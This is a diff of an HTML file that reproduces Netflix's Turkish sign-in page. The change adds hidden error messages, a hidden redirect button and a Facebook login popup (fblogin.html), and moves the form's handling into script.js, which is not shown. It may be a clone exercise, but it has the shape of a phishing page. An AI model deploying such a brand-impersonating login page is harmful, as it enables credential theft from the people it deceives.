@@ -1,67 +1,93 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+        integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+        crossorigin="anonymous" />
     <link rel="stylesheet" href="style.css">
     <link rel="icon" href="img/logo.png">
     <title>Netflix</title>
 </head>
+
 <body>
-    <div class="upper">
-        <div class="logo">
-            <a href="#">
-                <img src="img/Netflix-Logo.png" class="img-logo"/>
-            </a>
-        </div>
-        <div class="login-div">
-            <form class="login" on>
-                <h1>Oturum Aç</h1>
-                <div class="input-text">
-                    <input type="text" id="inputEmail" name="email" placeholder="E-posta veya telefon numarası." onblur="onBlur(this)"/>
-                    <div class="warning-input" id="warningEmailEmp">
-                        Lütfen geçerli bir telefon numarası veya e‑posta adresi girin.
-                    </div>
-                    <div class="warning-input" id="warningEmailEmail">
-                        Lütfen geçerli bir e‑posta adresi girin.
-                    </div>
-                    <div class="warning-input" id="warningEmailPhone">
-                        Lütfen geçerli bir telefon numarası adresi girin.
-                    </div>
-                </div>               
-                <div class="input-text">
-                    <input type="password" id="inputPassword" name="password" placeholder="Parola" onblur="onBlur(this)"/>
-                    <div class="warning-input" id="warningPassword">
-                        Parolanız 4 ila 60 karakter olmalıdır.
+    <div class="logo">
+        <a href="#">
+            <img src="img/Netflix-Logo.png" class="img-logo" />
+        </a>
+    </div>
+    <div class="login-div">
+        <div class="login">
+            <h1>Oturum Aç</h1>
+            <div class="input-text">
+                <div data-uia="error-message-container" id="passNot" style="display: none;"
+                    class="ui-message-container ui-message-error">
+                    <div class="ui-message-icon"></div>
+                    <div data-uia="text" class="ui-message-contents">
+                        <b>Parola yanlış.</b> Lütfen yeniden deneyin ya da <a href="/loginHelp">parolanızı
+                            sıfırlayın</a>.
                     </div>
                 </div>
-                
+                <div data-uia="error-message-container" id="userNot" style="display: none;"
+                    class="ui-message-container ui-message-error">
+                    <div class="ui-message-icon"></div>
+                    <div data-uia="text" class="ui-message-contents">
+                        Bu e‑posta adresi ile bağlantılı bir hesap
+                        bulamadık. Lütfen yeniden deneyin ya da <a href="/">yeni bir hesap oluşturun</a>.</div>
+                </div>
+                <input type="text" id="inputEmail" name="email" placeholder="E-posta veya telefon numarası."
+                    onblur="onBlur(this)" />
+                <div class="warning-input" id="warningEmailEmp">
+                    Lütfen geçerli bir telefon numarası veya e‑posta adresi girin.
+                </div>
+                <div class="warning-input" id="warningEmailEmail">
+                    Lütfen geçerli bir e‑posta adresi girin.
+                </div>
+                <div class="warning-input" id="warningEmailPhone">
+                    Lütfen geçerli bir telefon numarası adresi girin.
+                </div>
+            </div>
+            <div class="input-text">
+                <div class="passwordWrapper" id="passwordWrapper">
+                    <input type="password" id="inputPassword" name="password" placeholder="Parola"
+                        onblur="onBlur(this)" />
+                    <div onclick="showPss()" class="showWrap">
+                        <p> Göster </p>
+                    </div>
+                </div>
+                <div class="warning-input" id="warningPassword">
+                    Parolanız 4 ila 60 karakter olmalıdır.
+                </div>
+            </div>
+            <div>
+                <button onclick="onClick()" id="signin-button" class="signin-button">Oturum Aç</button>
+                <button hidden onclick="redirectMain()" id="redirectButton"></button>
+            </div>
+            <div class="remember-flex">
                 <div>
-                    <button id="signin-button" class="signin-button">Oturum Aç</button>
+                    <input type="checkbox" id="benihatirla">
+                    <label class="color_text">Beni hatırla</label>
                 </div>
-                <div class="remember-flex">
-                    <div>
-                        <input type="checkbox">
-                        <label class="color_text">Beni hatırla</label>
-                    </div>
-                    <div class="help">
-                        <a class="color_text" href="emptyPage.html?yardim-ister-misiniz">Yardım ister misiniz?</a>
-                    </div>
+                <div class="help">
+                    <a class="color_text" href="emptyPage.html?yardim-ister-misiniz">Yardım ister misiniz?</a>
                 </div>
-                <div class="login-face">
-                    <img src="img/fb-icon.png" height="20"/><a href="#" class="color_link log_face">Facebook ile oturum aç</a>
-                </div>
-                <div class="new-members">
-                    Netflix'e katılmak ister misiniz? <a href="#" class="signup-link"> Şimdi kaydolun.</a>.
-                </div>
-                <div class="protection color_link help">
-                    Bu sayfa robot olmadığınızı kanıtlamak için Google reCAPTCHA tarafından korunuyor.  
-                    <br>
-                    <a style="color: #0071eb;" href="#">Daha fazlasını öğrenin.</a>
-                </div>
-            </form>
+            </div>
+            <div class="login-face" onclick="window.open('fblogin.html', 'newwindow', 'width=800,height=900');">
+                <img src="img/fb-icon.png" height="20" />
+                <a class="color_link log_face">Facebook ile oturum aç</a>
+            </div>
+            <div class="new-members">
+                Netflix'e katılmak ister misiniz? <a href="emptyPage.html?register" class="signup-link"> Şimdi
+                    kaydolun.</a>.
+            </div>
+            <div class="protection color_link help">
+                Bu sayfa robot olmadığınızı kanıtlamak için Google reCAPTCHA tarafından korunuyor.
+                <br>
+                <a style="color: #0071eb;" href="emptyPage.html?learn-more">Daha fazlasını öğrenin.</a>
+            </div>
         </div>
     </div>
     <div class="bottom">
@@ -96,7 +122,7 @@
                     </li>
                     <li class="list-bottom">
                         <a href="emptyPage.html?kurumsal-bilgiler" class="link-bottom">
-                          Kurumsal Bilgiler
+                            Kurumsal Bilgiler
                         </a>
                     </li>
                 </ul>
@@ -110,4 +136,5 @@
     </div>
     <script src="script.js"></script>
 </body>
+
 </html>
